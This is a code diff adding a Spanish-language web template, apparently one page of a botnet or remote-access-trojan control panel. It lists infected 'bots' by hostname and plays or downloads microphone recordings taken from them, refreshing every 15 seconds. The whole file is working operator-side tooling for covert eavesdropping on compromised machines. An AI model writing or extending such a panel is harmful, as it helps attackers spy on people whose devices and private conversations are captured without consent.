@@ -1,0 +1,62 @@
+{% extends "base.html" %}
+
+{% block title %}Audio{% endblock %}
+
+{% block content %}
+<div class="section-header">
+    <h2><i class="fas fa-microphone"></i> Grabaciones de Audio</h2>
+    <div class="filters">
+        <select id="bot-filter" onchange="loadAudio()">
+            <option value="">Todos los bots</option>
+        </select>
+        <button class="btn" onclick="loadAudio()"><i class="fas fa-sync"></i></button>
+    </div>
+</div>
+
+<div class="audio-list" id="audio-list"></div>
+{% endblock %}
+
+{% block scripts %}
+<script>
+async function loadBots() {
+    const resp = await fetch('/api/panel/bots');
+    const bots = await resp.json();
+    const select = document.getElementById('bot-filter');
+    bots.forEach(bot => {
+        const opt = document.createElement('option');
+        opt.value = bot.bot_id;
+        opt.textContent = bot.hostname;
+        select.appendChild(opt);
+    });
+}
+
+async function loadAudio() {
+    const botId = document.getElementById('bot-filter').value;
+    const url = botId ? `/api/panel/audio?bot_id=${botId}` : '/api/panel/audio';
+    
+    try {
+        const resp = await fetch(url);
+        const recordings = await resp.json();
+        
+        document.getElementById('audio-list').innerHTML = recordings.map(a => `
+            <div class="audio-card">
+                <div class="audio-icon"><i class="fas fa-file-audio"></i></div>
+                <div class="audio-info">
+                    <p><i class="fas fa-robot"></i> ${a.bot_id.substring(0,12)}...</p>
+                    <p><i class="fas fa-clock"></i> ${new Date(a.timestamp).toLocaleString()}</p>
+                    <p><i class="fas fa-hourglass"></i> ${a.duration}s @ ${a.sample_rate}Hz</p>
+                </div>
+                <audio controls>
+                    <source src="/api/panel/audio/${a.id}" type="audio/wav">
+                </audio>
+                <a href="/api/panel/audio/${a.id}" download class="btn btn-sm"><i class="fas fa-download"></i></a>
+            </div>
+        `).join('');
+    } catch(e) {}
+}
+
+loadBots();
+loadAudio();
+setInterval(loadAudio, 15000);
+</script>
+{% endblock %}
